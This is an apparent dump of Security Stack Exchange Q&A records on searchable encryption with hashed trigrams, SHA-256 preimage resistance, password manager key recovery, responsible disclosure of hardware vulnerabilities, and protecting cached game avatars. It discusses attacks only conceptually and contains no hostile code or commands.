<p>Besides the problem with frequency of trigrams mentioned by &quot;Ja1024&quot;, the described scheme has two further problems. It is vulnerable to a <a href=""https://en.wikipedia.org/wiki/Known-plaintext_attack"" rel=""nofollow noreferrer"">Known-plaintext attack</a> and to a <a href=""https://en.wikipedia.org/wiki/Chosen-plaintext_attack"" rel=""nofollow noreferrer"">Chosen-plaintext attack</a>.</p>
<p>To make search possible, you have to encode the same trigram always <em>in the same way</em>. Otherwise the same part contained in different document will be not found.</p>
<p><a href=""https://en.wikipedia.org/wiki/Known-plaintext_attack"" rel=""nofollow noreferrer"">Known-plaintext attack</a>: Without having any information, each encoded trigram can correspond to one of 17576 (=26<em>26</em>26, in case only 26 lower case English letter used) plain trigrams. But if the attacker knows the plain text of one of the documents, then the attacker will reduce the number of possible pre-images for each trigram to 50 or 100 instead of 17576.</p>
<p><a href=""https://en.wikipedia.org/wiki/Chosen-plaintext_attack"" rel=""nofollow noreferrer"">Chosen-plaintext attack</a>: The attacker creates a document and several copies with small modifications, e.g. only single letter changed. Then the attacker cause the user to upload these document to your server. Then the attacker compares the sets of trigrams. The sets of encoded trigrams on the server will be almost identical and will have a few differences only. The attacker will know then, what encoded trigrams correspond to the modified document element. Thus, the attacker will know the plain text for these encoded trigrams. When repeated, more and more trigrams can be restored.</p>
<p>If the <a href=""https://en.wikipedia.org/wiki/Chosen-plaintext_attack"" rel=""nofollow noreferrer"">Chosen-plaintext attack</a> attack can be done sufficiently many times, then plain text can be restored for every encoded trigram.</p>
<p>Even if <a href=""https://en.wikipedia.org/wiki/Chosen-plaintext_attack"" rel=""nofollow noreferrer"">Chosen-plaintext attack</a> can be done only a limited number of times, it can still essentially simplify the <em>frequency analysis</em>. Frequency analysis deals with probabilities. Often there are multiple candidates that have very close frequency and the attacker has to try multiple candidates for the same encoded value. This leads to an exponentially growing number of combinations to test. But the two attacks described above can essentially simplify frequency analysis.</p>
<p><strong>It is not full text search</strong></p>
<p>Suppose you found a solution to prevent restoring of plain data. There is one more point to consider. Please pay attention that the described scheme is <strong>not</strong> a <a href=""https://en.wikipedia.org/wiki/Full-text_search"" rel=""nofollow noreferrer"">full text search</a> and that's why cannot be as efficient. For instance, <a href=""https://en.wikipedia.org/wiki/Full-text_search"" rel=""nofollow noreferrer"">full text search</a> allows to consider different forms of the same word, allows to find synonyms, e.g. if user is searching for a &quot;car&quot;, also &quot;vehicle&quot; and &quot;truck&quot; may be found. Or if user is searching for &quot;fruit&quot;, also &quot;fruits&quot;, also typos like &quot;friut&quot; and  &quot;friuts&quot;, also synonyms like &quot;apples&quot; will be found. None of this will work in your case.</p>
","2"
"269960","269960","Using hashed trigrams to search over encrypted data","<p>For practice, I write let's call it a notebook app that stores users' notes in AES-encrypted form. For encryption, I use a password-based intermediate key technique as described <a href=""https://security.stackexchange.com/a/88989/292322"">here</a>. Actually, the exact encryption method doesn't matter here, just so you know that only the client has the ability to decrypt the notes.</p>
<p>I want to implement a basic search algorithm that would let users search over their notes. Obviously, you can't just encrypt the search phrase and search it over the database or something like that, so here's an idea:</p>
<p>When a user creates or updates a note, the client-side algorithm creates a list of its trigrams, filters duplicates, then hashes each one of them, and then passes it to the server where it's stored alongside the encrypted note text in the database. When hashing trigrams, the user's personal salt has to be used.</p>
<p>When searching, the same thing applies to the search phrase and the database tries to search notes by given hashed trigrams.</p>
<p>So I have a couple of questions about this idea:</p>
<ul>
<li>Would it be secure enough?</li>
<li>Would it decrease security if the hashes of trigrams get truncated to save some space? To handle collisions, the decrypted text could be checked on the client to verify it does have matches.</li>
<li>What would be more efficient?
<ul>
<li>To store trigrams of a note as string divided by spaces in a separate column, then search them with <code>LIKE</code> or <code>REGEXP</code> statement</li>
<li>Or to store them in a separate table with one row per trigram with a foreign key, and search over them with <code>=</code> operator</li>
</ul>
</li>
</ul>
<p><strong>Edit after some comments:</strong></p>
<p>To prevent brute-force, the encryption key (or even a hashed version of it) could be used as the salt for hashing trigrams. I suppose it can work because the key can only be known by client. Is it a good way to deal with it, or there are drawbacks of this approach I fail to see?</p>
<p>As I've been told that using the same string as a salt <em>and</em> as a key could be a bad idea, there's an alternative way: we generate this &quot;trigram salt&quot; when the user signs up, encrypt it with the encryption key and store it in the database, then use its decrypted form as mentioned above.</p>
","4","4","269991","<p>If you really need server-side ngram search on encrypted data, then yes, this hashed-trigram approach is to be among the most practical options. However, it is easy to leak information like this.</p>
<p>A critical part of the security of this scheme is that the ngram hashes are &quot;salted&quot; per user, i.e. are calculated using a keyed hash or HMAC function. Thus, two users with the same document but different keys will get a different hashed ngram set. Truncating the hashes does not reduce security in any way, it might even help by making hashes less distinguishable. However, this will reduce search performance a bit, by making false positive hits more likely.</p>
<p>There is however the problem that the hashed ngrams disclose a frequency distribution of ngrams in the document. Some ngrams are very frequent in English language, some less so. By comparing the hashed ngram distribution in your database index with the expected distribution, it might be possible to probabilistically reconstruct some messages. This becomes even more important when the attacker can provide a document that you store with this encrypted method. Then they could correlate the known ngrams with the entries in your database index, and use that as their Rosetta stone for decoding parts of the document contents. <a href=""https://security.stackexchange.com/a/269984"">Mentallurg's answer discusses these problems in more detail</a>.</p>
<p>Such attacks can be made more difficult by adding a large number of random hashes to the index. This will reduce search performance (depending on how much you truncate the hashes), but it can increase privacy in a manner similar to k-anonymity models.</p>
<p>To reduce information leakage, using fixed-size bloom filters might be preferable. A bloom filter is a bit vector that represents a set of values. Adding a value to the set involves hashing the data with multiple different hash functions (or a keyed hash functions with multiple keys), using the hashes as indices into the bit vector, and setting those bits. To query whether an entry exists in the set, you check whether the bits at these indices are set. The size of the bit vector, the number of hash functions, and the number of entries affect the false positive rate. You can additionally set random bits, which will increase the false positive rate. If all documents are indexed with a bit vector of same size, and have the same percentage of bits set, then it would become more difficult for an attacker to extract useful information them. This can be made even harder if the hash functions don't map entries to a single set of indices, but to multiple potential sets, and select one of them at random (at the cost of making querying more complicated, because you'd have to check all potential positions).</p>
<p>Information leakage can also occur during querying. In your context, a query consists of repeated questions “in which documents does the ngram <code>abc</code> occur?”. Under the keywords “private information retrieval”, “oblivious transfer”, or “private set intersection” you'll find lots of existing solutions, some of them cryptographically safe. A non-cryptographic method would involve not just sending your actual queries, but also sending plausible alternative queries. When using truncated hashed identifiers, you can generate such queries as random numbers. But since this will lead to additional data transfer and to false positives, this will likely reduce search performance. It is also possible that this noise is not sufficient to mask the data distributions of the true queries – ngram hashes or bloom filter indices that occur in multiple queries are more likely to be real.</p>
","1"
"269862","269862","Is it possible to generate a file with a given sha256sum checksum?","<p>Is it possible to generate a file with a given sha256sum checksum?</p>
<p>That is, reverse the process of a sha256sum checksum. That is, if we have a checksum, can we generate txt file data <strong>(need not be original)</strong> whose its checksum is equal to the required checksum?</p>
<p>Just highlighting &quot;I don't need the original file. Any other random file with given sha256sum is also ok&quot;</p>
<p>Also, can two or more files have the same sha256sum?</p>
","14","6","269863","<p>No. It is computationally infeasible.</p>
<p>It is not obvious. One might think that since the algorithm is simple and since the number of collisions is infinite, there should be a way to find a file for the given hash. (Because of <a href=""https://en.wikipedia.org/wiki/Pigeonhole_principle"" rel=""noreferrer"">pigeonhole principle</a> there exists at least one hash that can be produced by an infinite number of files; we don't know if there are more such hashes, and how many; neither we know if for any hash there exists a file that produces it).</p>
<p>But currently there is no algorithm known to find a file that produces the given hash within a practically acceptable time. This property is called <a href=""https://en.wikipedia.org/wiki/Preimage_attack"" rel=""noreferrer"">pre-image resistance</a>. By &quot;no algorithm known&quot; we mean no algorithm except of brute-forcing, which in case of SHA-256 would require the computing power of the whole world for the time longer than the Universe exists.</p>
<p>SHA-256 was designed to be used for cryptographic purposes and <a href=""https://en.wikipedia.org/wiki/Preimage_attack"" rel=""noreferrer"">pre-image resistance</a> is a <em>desired</em> property.</p>
<p>See more details here: <a href=""https://crypto.stackexchange.com/questions/39220/what-gives-sha-256-its-preimage-resistance"">What gives SHA-256 its preimage resistance?</a></p>
","33"
"269862","269862","Is it possible to generate a file with a given sha256sum checksum?","<p>Is it possible to generate a file with a given sha256sum checksum?</p>
<p>That is, reverse the process of a sha256sum checksum. That is, if we have a checksum, can we generate txt file data <strong>(need not be original)</strong> whose its checksum is equal to the required checksum?</p>
<p>Just highlighting &quot;I don't need the original file. Any other random file with given sha256sum is also ok&quot;</p>
<p>Also, can two or more files have the same sha256sum?</p>
","14","6","269898","<p>Of course it's possible but where do you find a computer that's powerful enough to do so? You can always just write a program that starts creating every single possible combination of bytes and calculates the checksum for it until it matches, but that would take an insane amount of time.</p>
<p>It's also possible for 2 files to have the same checksum, the checksums aren't infinitely long so there also aren't an infinite amount of combinations. Finding 2 files with identical checksums will be nearly impossible though. Maybe when we have quantum computers.</p>
","0"
"269862","269862","Is it possible to generate a file with a given sha256sum checksum?","<p>Is it possible to generate a file with a given sha256sum checksum?</p>
<p>That is, reverse the process of a sha256sum checksum. That is, if we have a checksum, can we generate txt file data <strong>(need not be original)</strong> whose its checksum is equal to the required checksum?</p>
<p>Just highlighting &quot;I don't need the original file. Any other random file with given sha256sum is also ok&quot;</p>
<p>Also, can two or more files have the same sha256sum?</p>
","14","6","269905","<p>Theoretically yes, but practically no (we think).</p>
<p>SHA-256 is designed to be a <a href=""https://en.wikipedia.org/wiki/Cryptographic_hash_function"" rel=""noreferrer"">cryptographic hash function</a>. Among other things, this means that it's designed to be resistant to doing what you're asking (which is either a &quot;pre-image&quot;, &quot;second pre-image, or possibly &quot;collision&quot; attack).</p>
<p>Basically, those are all slightly different ways of asking &quot;can I generate a file whose SHA-256 hash is 'h'&quot;.</p>
<p>To the best of our knowledge, there's no way to &quot;run the algorithm backwards&quot;. That is: there's no way to start with a hash and run the math backwards to see what the original message (file) was. That means that, to the best of our knowledge, the only way to see what message might hash to a certain value is to start trying messages to see where they go.</p>
<p>SHA-256 hashes are 256 bits long, which means that there are 2^256 ~= 1.16e+77 possible hash values. <a href=""https://www.newscientist.com/article/mg15020308-500-the-last-word/"" rel=""noreferrer"">New Scientist reports</a> that there are &quot;about 1.04 × 10^44 molecules in the Earth’s atmosphere&quot; (making some simplifying assumptions). <a href=""https://solarsystem.nasa.gov/solar-system/beyond/overview/"" rel=""noreferrer"">NASA reports</a> that there are &quot;at least 100 billion stars in the Milky Way&quot; (1 billion = 1,000,000,000, so 100 billion = 100,000,000,000 = 1e11). If every star in the Milky Way has a copy of Earth, that's ~1e55 molecules of atmosphere; if every star had 1,000 Earths, that's still only ~1e58 molecules of atmosphere. If every one of those molecules had a unique 256-bit number (which a SHA-256 hash can be treated as), we still need to find a few more billions to get to even a full 1% of the possible values.</p>
<p><a href=""https://www.e-education.psu.edu/astro801/content/l10_p5.html"" rel=""noreferrer"">The universe is 13.4 billion years old</a>, or about 4.2e+17 seconds. If each molecule of atmosphere got a new, unique 256-bit number every second since the big bang, we're up to around 4e75, or about 4% of the possible values.</p>
<p>To be guaranteed to find a file that generates a given SHA-256 hash, you need to search every molecule of atmosphere across every one of those Earths once a second for ~25 times the age of the universe. On average, you'd find one in about 12.5 times the age of the universe.</p>
<p>... we think. It's possible that there's a short-cut, but nobody has found one yet.</p>
","12"
"269862","269862","Is it possible to generate a file with a given sha256sum checksum?","<p>Is it possible to generate a file with a given sha256sum checksum?</p>
<p>That is, reverse the process of a sha256sum checksum. That is, if we have a checksum, can we generate txt file data <strong>(need not be original)</strong> whose its checksum is equal to the required checksum?</p>
<p>Just highlighting &quot;I don't need the original file. Any other random file with given sha256sum is also ok&quot;</p>
<p>Also, can two or more files have the same sha256sum?</p>
","14","6","269907","<p>I will answer the second question first, it will make more sense.</p>
<blockquote>
<p>Can 2 or more files have the same sha256sum?</p>
</blockquote>
<p>Yes, it's possible. It's called <em>collision</em> and it's a property of any hash function. As the output size is limited but the amount of possible inputs is not, there will be unlimited distinct inputs that map to the same output.</p>
<p>For instance, create a very simple hash function (I will call it <em>Mod2</em>) that converts the input to an integer, divides by 2 and returns the remainder. There are only 2 possible outcomes (0 or 1) for any number of inputs, so when you enter 381 and 111111113 and have the same output, you have a collision.</p>
<p>SHA256 is more useful than our Mod2, because it has 256 bits of output (hence 256 on its name), so the possible outputs is 2²⁵⁶. That's a very large number, but it's way smaller than the amount of possible inputs. As Peter reminded me on the comment, the SHA hashes are <em>cryptographically secure hashes</em>, and that means that a minimal change on the input will generate a very large difference on the output. CRC32 is an example of a non cryptographic hash function.</p>
<blockquote>
<p>Is it possible to generate a file with the given sha256sum checksum?</p>
</blockquote>
<p>If you get our <em>Mod2</em> hash function before, can you create an input only having the output? Sure you can! Just get the output (1, for instance), throw an input on the function (say 9000), and check if the result is 1. It's not, so you take another input (say 9001), check the result, and it's 1. You generated <strong>a file</strong> using the hash, but you have no way to tell if you generated <strong>the file</strong>. It could be 31337 and you believed it was 9001.</p>
<p>You are able to generate something that collides with the output, but it's not possible to guarantee that you created the original file that produced that output. Not only that, but to create a collision on a 256-bit output space you would have to use so much computing power that makes no sense to do so. It will cost several orders of magnitude more than just storing the entire file on the most expensive media you have around.</p>
","4"
"269862","269862","Is it possible to generate a file with a given sha256sum checksum?","<p>Is it possible to generate a file with a given sha256sum checksum?</p>
<p>That is, reverse the process of a sha256sum checksum. That is, if we have a checksum, can we generate txt file data <strong>(need not be original)</strong> whose its checksum is equal to the required checksum?</p>
<p>Just highlighting &quot;I don't need the original file. Any other random file with given sha256sum is also ok&quot;</p>
<p>Also, can two or more files have the same sha256sum?</p>
","14","6","269908","<p>It is highly unlikely that you can generate a file with a specific sha256sum checksum.
Sha256 is a cryptographic hash function, meaning it is a one-way only function.
In other words, it is, as of the current time at least, not possible to reverse the process and generate a file that matches a given sha256 checksum.
The only way is to brute force the contents of a file until it randomly matches the checksum.</p>
<p>It is also theoretically indeed possible to create a file with the same sha256 checksum as another file.
This is known as a &quot;collision attack&quot;.
However, finding such a collision also requires much computing power and is practically unlikely to happen or even up to impossible, too.</p>
<p>As for your follow-up question, it is theoretically possible for two different files to have the same or find the original contents of the sha256 checksum. However, the probability of this happening is extremely low.
The sha256 algorithm produces a 256-bit hash value, which means that there are 2^256 possible hash values. The chance of two files producing the same hash value is therefore very unlikely.</p>
","4"
"269862","269862","Is it possible to generate a file with a given sha256sum checksum?","<p>Is it possible to generate a file with a given sha256sum checksum?</p>
<p>That is, reverse the process of a sha256sum checksum. That is, if we have a checksum, can we generate txt file data <strong>(need not be original)</strong> whose its checksum is equal to the required checksum?</p>
<p>Just highlighting &quot;I don't need the original file. Any other random file with given sha256sum is also ok&quot;</p>
<p>Also, can two or more files have the same sha256sum?</p>
","14","6","269945","<blockquote>
<p>Is it possible to generate a file with a given sha256sum checksum?</p>
</blockquote>
<p>Yes.  It is possible to generate an input with the given checksum. (See answer to your last question).</p>
<blockquote>
<p>That is, reverse the process of a sha256sum checksum. That is, if we have a checksum, can we generate txt file data (need not be original) whose its checksum is equal to the required checksum?</p>
</blockquote>
<p>No, sha256 is not reversible.</p>
<blockquote>
<p>Also, can two or more files have the same sha256sum?</p>
</blockquote>
<p>Yes, more than one input can generate the same output.</p>
<p>Since sha256 is a hashing algorithm, it is possible for more than one input to generate the same output.  Sha256 generates a finite number of outputs (2^256) given an infinite number of possible inputs.  If you somehow managed to find an input that generates a given checksum, there is no guarantee that it is the original input that generated the checksum in the first place.  This is called a collision and is a feature of hashing algorithms in general.</p>
<p>Since 2^256 is a large number, the possibility for collisions is small.  That is why sha256 is very useful as a check for data integrity.  For example, when you download a file, many sites will give you a sha256 checksum to validate the integrity of your download.  If bits get corrupted during transfer, the algorithm will almost certainly produce a very different checksum from the original.  It is not a guarantee that the data is not corrupt, however, but your confidence can be extremely high it is not.</p>
","1"
"269861","269861","Password managing apps seem to have access to my passwords","<p>Keeper used to be free so I had stored most of passwords on that app a few years ago from a past device. When I tried to access the passwords after five years, the app had turned into a subscription model and held my passwords as hostage. I had no choice, but to pay for their yearly subscription. I am in the process of moving my passwords out and looking for another app to use. (Currently leaning towards Samsung Pass)</p>
<p>However this had me thinking... For the apps to be able to recover my passwords saved from another device, they have to have the passwords in a two-way encryption model, which gives the company access to my passwords if they wanted to.</p>
<p>Usually passwords are stored via a one-way hash. However password management apps need to be able to show the passwords in plain-text to the user. So I'm guessing they use a local enc. key saved on the device or an enc. key saved on the cloud(via hash ofc) to encrypt the passwords. This way only I will be able to see those encrypted passwords via my local key or password key(which the server hashes).</p>
<p>However, here is the catch. If in the case I lose my device or forget my account password, I would still want to have access to my passwords. Google Password Manger &amp; Keeper both have this functionality. In the case of local key, this scenario cannot work. So these products must have the encryption key hashed somewhere in their cloud. Then let's look at how the cloud version would work.</p>
<p>For simplicity let's say the enc. key is my Keeper password. And say I forgot my Keeper password. To be able to recover my password wallet that is encrypted with my forgotten Keeper password, you need the original Keeper password. There seems to be no way around it. However with Keeper, it lets you reconfigure your account's password and gives you access to my password wallet. This means Keeper stores that enc. key somewhere in their database via two-way hash(or god forbid plain-text).</p>
<p>The ability to retrieve your password wallet even after losing your device or losing your account's password only works if the company has access to your enc. key. That means the company can access all my passwords since they have the enc. key.</p>
<p>Am I missing something? Is there an encryption method that does not rely on a two-way encryption method for this to work?</p>
","1","3","269865","<p>If a service can give you access to your passwords without you providing any secret -- be it directly through a master password or indirectly through some data stored locally on your device --, then, yes, that service could also access the passwords itself. No matter how sophisticated the encryption scheme is, it still relies on secrets, so there are only two cases.</p>
<ul>
<li>Either you manage at least parts of the secrets. Then it's quite possible to completely hide the passwords from the services, but it's also your responsibility to back up your secrets. There's no way to recover the passwords if you've forgotten and lost everything.</li>
<li>Or you let the service manage all secrets. Then you can have a recovery feature, but it's not possible to technically prevent the service from ever accessing (or accidentally leaking) your passwords. You'll have to trust the service.</li>
</ul>
","0"
"269861","269861","Password managing apps seem to have access to my passwords","<p>Keeper used to be free so I had stored most of passwords on that app a few years ago from a past device. When I tried to access the passwords after five years, the app had turned into a subscription model and held my passwords as hostage. I had no choice, but to pay for their yearly subscription. I am in the process of moving my passwords out and looking for another app to use. (Currently leaning towards Samsung Pass)</p>
<p>However this had me thinking... For the apps to be able to recover my passwords saved from another device, they have to have the passwords in a two-way encryption model, which gives the company access to my passwords if they wanted to.</p>
<p>Usually passwords are stored via a one-way hash. However password management apps need to be able to show the passwords in plain-text to the user. So I'm guessing they use a local enc. key saved on the device or an enc. key saved on the cloud(via hash ofc) to encrypt the passwords. This way only I will be able to see those encrypted passwords via my local key or password key(which the server hashes).</p>
<p>However, here is the catch. If in the case I lose my device or forget my account password, I would still want to have access to my passwords. Google Password Manger &amp; Keeper both have this functionality. In the case of local key, this scenario cannot work. So these products must have the encryption key hashed somewhere in their cloud. Then let's look at how the cloud version would work.</p>
<p>For simplicity let's say the enc. key is my Keeper password. And say I forgot my Keeper password. To be able to recover my password wallet that is encrypted with my forgotten Keeper password, you need the original Keeper password. There seems to be no way around it. However with Keeper, it lets you reconfigure your account's password and gives you access to my password wallet. This means Keeper stores that enc. key somewhere in their database via two-way hash(or god forbid plain-text).</p>
<p>The ability to retrieve your password wallet even after losing your device or losing your account's password only works if the company has access to your enc. key. That means the company can access all my passwords since they have the enc. key.</p>
<p>Am I missing something? Is there an encryption method that does not rely on a two-way encryption method for this to work?</p>
","1","3","269867","<blockquote>
<p>However with Keeper, it lets you reconfigure your account's password and gives you access to my password wallet. This means Keeper stores that enc. key somewhere in their database via two-way hash(or god forbid plain-text).</p>
</blockquote>
<p>No. It does not mean it stores the encryption key anywhere. It <em>can</em> potentially (to know that exactly, you can check the <a href=""https://github.com/Keeper-Security"" rel=""nofollow noreferrer"">source code</a>), but there is <em>no need</em>. It is sufficient to ask for the old key and for the new one. Using the old key, the encrypted data will be decrypted. Using the new key, these plain data will be encrypted again.</p>
<blockquote>
<p>The ability to retrieve ... even after losing ... your account's password only works if the company has access to your enc. key. That means the company can access all my passwords since they have the enc. key.</p>
</blockquote>
<p>Not necessarily. If the password manager can tell you what your password is <em>without any input</em> from your side, then yes, they know encryption key and yes, they can access all your passwords. But if they ask you for some <em>input</em> like Keeper, they may or may not restore your encryption key without you.</p>
<p>The Keeper says they encrypt/decrypt passwords <em>locally</em> only. You can check the <a href=""https://github.com/Keeper-Security"" rel=""nofollow noreferrer"">source code</a>, if they implemented it as they say. Then you can build it and compare to what is installed on your device. If they really encrypt/decrypt passwords <em>locally</em> only, then they cannot decrypt what is stored on their server and thus they don't have access to your passwords.</p>
","0"
"269861","269861","Password managing apps seem to have access to my passwords","<p>Keeper used to be free so I had stored most of passwords on that app a few years ago from a past device. When I tried to access the passwords after five years, the app had turned into a subscription model and held my passwords as hostage. I had no choice, but to pay for their yearly subscription. I am in the process of moving my passwords out and looking for another app to use. (Currently leaning towards Samsung Pass)</p>
<p>However this had me thinking... For the apps to be able to recover my passwords saved from another device, they have to have the passwords in a two-way encryption model, which gives the company access to my passwords if they wanted to.</p>
<p>Usually passwords are stored via a one-way hash. However password management apps need to be able to show the passwords in plain-text to the user. So I'm guessing they use a local enc. key saved on the device or an enc. key saved on the cloud(via hash ofc) to encrypt the passwords. This way only I will be able to see those encrypted passwords via my local key or password key(which the server hashes).</p>
<p>However, here is the catch. If in the case I lose my device or forget my account password, I would still want to have access to my passwords. Google Password Manger &amp; Keeper both have this functionality. In the case of local key, this scenario cannot work. So these products must have the encryption key hashed somewhere in their cloud. Then let's look at how the cloud version would work.</p>
<p>For simplicity let's say the enc. key is my Keeper password. And say I forgot my Keeper password. To be able to recover my password wallet that is encrypted with my forgotten Keeper password, you need the original Keeper password. There seems to be no way around it. However with Keeper, it lets you reconfigure your account's password and gives you access to my password wallet. This means Keeper stores that enc. key somewhere in their database via two-way hash(or god forbid plain-text).</p>
<p>The ability to retrieve your password wallet even after losing your device or losing your account's password only works if the company has access to your enc. key. That means the company can access all my passwords since they have the enc. key.</p>
<p>Am I missing something? Is there an encryption method that does not rely on a two-way encryption method for this to work?</p>
","1","3","269881","<p><strong>This is not an endorsement. SuperGenPass is not regarded as a good security model.</strong></p>
<p><a href=""https://chriszarate.github.io/supergenpass/"" rel=""nofollow noreferrer"">SuperGenPass</a> is the only password manager I know of that does not store passwords at all:</p>
<blockquote>
<p><strong>SuperGenPass</strong> is a different kind of password solution. Instead of storing your passwords on your hard disk or online—where they are vulnerable to theft and data loss—SuperGenPass uses a hash algorithm to transform a master password into unique, complex passwords for the Web sites you visit.</p>
<p>SuperGenPass is a bookmarklet and runs right in your Web browser. <strong>It never stores or transmits your passwords</strong>, so it’s ideal for use on multiple and public computers. It’s also completely free and <a href=""https://github.com/chriszarate/supergenpass"" rel=""nofollow noreferrer"">open-sourced on GitHub</a>.</p>
</blockquote>
<p>All this really does is transform your master password with the host site as a seed into a hash that you use as a password. It's very elegant, at least until you find a site whose password requirements do not fit the prescribed scheme—then you have to remember the iteration you need to satisfy the complexity requirement.</p>
<p>I'm not sure of the exact algorithm, but it's at least very similar to this: append the domain name to your master password, then hash the results, like:</p>
<p><code>md5_base64(&quot;jostlexQ%Z!2spiCe8$&quot; + &quot;stackexchange.com&quot;)</code> → <code>AtXU1RzS+L23FpNObIA/0w</code></p>
<p>Even if this were altered to use a more secure hash like Argon2, there is no ability to change passwords without changing your master password for that site, suggesting that this system would only work with a traditional password manager (to store the SGP &quot;master&quot; input). If that password manager's data were compromised, SGP would provide an extra layer of security … through obscurity.</p>
<p>Any other password manager is going to have to encrypt and store your passwords. If you don't want them in the cloud, do not use a cloud-based password manager (but make sure you back up that database somehow!). <a href=""https://keepassxc.org/"" rel=""nofollow noreferrer"">KeePassXC</a> is a great non-cloud solution.</p>
","-1"
"269842","269842","Is a responsible disclosure for hardware-based vulnerabilities even possible?","<p>In the last decade side-channel attacks like fault injection attacks (e.g., voltage glitching attacks) have been used to bypass JTAG locks or read-out memory protections. Such vulnerabilities might not be easy to prevent. They can be caused by the hardware design or by the firmware in use. Therefore, in order to fix such vulnerabilities, vendors might need to change hardware design of their products so that the vulnerability cannot be easily fixed in customer products without replacing the component.</p>
<p>Is such a thing as &quot;responsible disclosure&quot; even possible, given that fixing such a vulnerability might need a hardware redesign and a replacement of components?</p>
<p>Would it therefore not be unethical to release any public information after 90 days?</p>
","20","4","269843","<p>The idea of a responsible disclosure is to protect the customers both in the short term and the long term. What this exactly means in terms of disclosure timelines and details depends on how severe the vulnerability is, how fast it can be fixed and how fast the fixes can be rolled out by the customers. There is no single approach to responsible disclosure which works for all cases.</p>
<p>In the long term it is good if the affected products get fixed or at least newer products don't have the same vulnerability. This might take longer with hardware based vulnerabilities than with purely software. For fixing the problem the manufacturer needs to know the problem, so disclosing it to the manufacturer is a good thing. If it is a more generic vulnerability affecting multiple manufacturers or even standards, then it needs an even wider disclosure.</p>
<p>But customers need to protect themselves in the short term already. For this they might not need all the details about the vulnerability or even working exploits, but <strong>customers need enough details to determine their risks and mitigate them</strong>. How this mitigation will be done with vulnerabilities in the hardware depends on how the product is used by the customer, i.e. it might mean to add better physical protection around the product or in the worst case stop using the product completely.</p>
","28"
"269842","269842","Is a responsible disclosure for hardware-based vulnerabilities even possible?","<p>In the last decade side-channel attacks like fault injection attacks (e.g., voltage glitching attacks) have been used to bypass JTAG locks or read-out memory protections. Such vulnerabilities might not be easy to prevent. They can be caused by the hardware design or by the firmware in use. Therefore, in order to fix such vulnerabilities, vendors might need to change hardware design of their products so that the vulnerability cannot be easily fixed in customer products without replacing the component.</p>
<p>Is such a thing as &quot;responsible disclosure&quot; even possible, given that fixing such a vulnerability might need a hardware redesign and a replacement of components?</p>
<p>Would it therefore not be unethical to release any public information after 90 days?</p>
","20","4","269848","<blockquote>
<p>to bypass JTAG locks or read-out memory protection</p>
</blockquote>
<p>In most cases, this only poses risk of exposing manufacturer's own intellectual property. Code read-out protection is not the only way to protect that, they can also e.g. monitor whether clone products appear on market and litigate.</p>
<p>For some specific cases, like a hardware password manager or crypto wallet, debugger access could expose user's data to an attacker with physical access. In that case a responsible disclosure would give enough time for manufacturer to alert customers about the risk, even if no fix is possible.</p>
<p>The debugger access also enables further security analysis that can discover security problems in the firmware. But typically those are software bugs that can be fixed with a firmware update, following a normal disclosure process.</p>
","13"
"269842","269842","Is a responsible disclosure for hardware-based vulnerabilities even possible?","<p>In the last decade side-channel attacks like fault injection attacks (e.g., voltage glitching attacks) have been used to bypass JTAG locks or read-out memory protections. Such vulnerabilities might not be easy to prevent. They can be caused by the hardware design or by the firmware in use. Therefore, in order to fix such vulnerabilities, vendors might need to change hardware design of their products so that the vulnerability cannot be easily fixed in customer products without replacing the component.</p>
<p>Is such a thing as &quot;responsible disclosure&quot; even possible, given that fixing such a vulnerability might need a hardware redesign and a replacement of components?</p>
<p>Would it therefore not be unethical to release any public information after 90 days?</p>
","20","4","269897","<p>Everything Steffan said, and more. Specifically, in &quot;customers need enough details to determine their risks and mitigate them&quot;, mitigate includes even things like &quot;throw away the affected devices and go back to a non-electronic process&quot; or &quot;change physical security practices so that the vulnerability is no longer attack surface&quot;.</p>
<p>I would go so far as to say that, for hardware based vulnerabilities, the default &quot;responsible disclosure&quot;, short of a specific reason otherwise, should be &quot;immediate full disclosure&quot;. Unlike with software, there is <strong>no way</strong> vendors can deliver a timely fix to everyone affected, so there is utterly no benefit to the affected parties (users/customers and people they are protecting) if you give the vendor early notice.</p>
","0"
"269842","269842","Is a responsible disclosure for hardware-based vulnerabilities even possible?","<p>In the last decade side-channel attacks like fault injection attacks (e.g., voltage glitching attacks) have been used to bypass JTAG locks or read-out memory protections. Such vulnerabilities might not be easy to prevent. They can be caused by the hardware design or by the firmware in use. Therefore, in order to fix such vulnerabilities, vendors might need to change hardware design of their products so that the vulnerability cannot be easily fixed in customer products without replacing the component.</p>
<p>Is such a thing as &quot;responsible disclosure&quot; even possible, given that fixing such a vulnerability might need a hardware redesign and a replacement of components?</p>
<p>Would it therefore not be unethical to release any public information after 90 days?</p>
","20","4","269923","<p>Hardware vulnerabilities rarely have a proper fix short of replacing the affected hardware. Often a firmware mitigation is possible which merely disables the vulnerable hardware feature, which inherently creates a conflict of interest: users would like to keep the affected feature if they deem the vulnerability is not affecting them, while manufacturers would rather protect themselves from liability and/or protect their own IP. Note that the lion's share of such vulnerabilities are essentially failed restriction measures the manufacturer has put in place to prevent the user from getting access to certain features, such as debug interfaces.</p>
<p>Disclosing the vulnerability to the manufacturer before making it public can therefore put customers at disadvantage, preventing them from taking measures (such as disabling firmware updates or avoiding official repair services) that would preserve the functionality they need.</p>
","1"
"269805","269805","Is there a way to store data securely on a client so that it can only be read by the client while connected to an authorising source?","<p>I have a difficult issue facing an online gaming social space I frequent where personal content I've made for the platform is being stolen by users.</p>
<p>I'm wondering if there are any solutions to make this much harder to steal work from other users.</p>
<p>To explain: Alice, Bob and Emile join a public session. All users do not know each other, they trust the content server but may not yet trust each other. The content server sends each user copies of each other's personal user avatars and data so they can be represented in the session.</p>
<p>This data is loaded in memory in the clear so it can be rendered, but memory is notionally protected by various scrambling techniques to make it a harder attack vector.</p>
<p>The data is also cached locally on each user's machine so that if they meet again, data does not need to be sent again from the server to save bandwidth and loading times.</p>
<p>However, after meeting, Emile accesses his cache and is able to extract the data, stealing the avatars within it that belong to Alice and Bob, allowing Emile to visually impersonate, misrepresent Alice and Bob or just make unauthorised use of the content.</p>
<p>Is there a way for the cached data to be encrypted such that it can only be decrypted in memory while Alice or Bob are connected via the network in an active session?</p>
","1","3","269806","<p>Encrypting the cache is certainly possible but it is a locally enforced security measure.  That is, with enough effort, the local system can be modified to simply not do it.  Further, if something is ever decrypted for any reason it is copyable.  If it exists in memory an attacker can access, it can be copied.  GPUs do not render encrypted data well, it has to be fully decrypted at some point.</p>
<p>Copyright in general is a cat and mouse game of ever increasing security controls.  It's not fully solved for the likes of Netflix so the odds of whatever game solving it is pretty low.</p>
